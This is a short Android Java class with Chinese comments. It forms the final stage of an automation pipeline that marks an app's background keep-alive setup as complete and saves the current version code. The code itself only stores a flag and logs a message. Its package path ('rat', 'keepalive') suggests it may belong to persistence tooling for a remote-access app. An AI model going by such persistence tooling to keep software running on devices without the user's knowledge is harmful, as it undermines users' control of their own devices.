package com.vendor.rat.auto.pipeline.stage;

import android.content.Context;
import android.util.Log;

import com.vendor.rat.auto.pipeline.PipelineContext;
import com.vendor.rat.auto.pipeline.PipelineStage;
import com.vendor.rat.keepalive.thread.StrategyThread;

/**
 * Stage 10: 标记完成
 *
 * 持久化保活自动化完成状态 + 当前 versionCode。
 * 下次启动时 CompletionCheckStage 会检查这两个值。
 */
public class MarkCompletedStage implements PipelineStage {

    private static final String TAG = "MarkCompletedStage";

    @Override
    public void handle(PipelineContext passable, Runnable next) {
        // 保存 keepAliveCompleted = true
        StrategyThread.markKeepAliveCompleted();

        // 保存当前 versionCode
        Context appCtx = passable.getAppContext();
        if (appCtx != null) {
            VersionCheckStage.saveVersionCode(appCtx, passable.getCurrentVersionCode());
        }

        Log.i(TAG, "Pipeline completed, versionCode=" + passable.getCurrentVersionCode()
            + ", elapsed=" + passable.getElapsedMs() + "ms");
        next.run();
    }
}
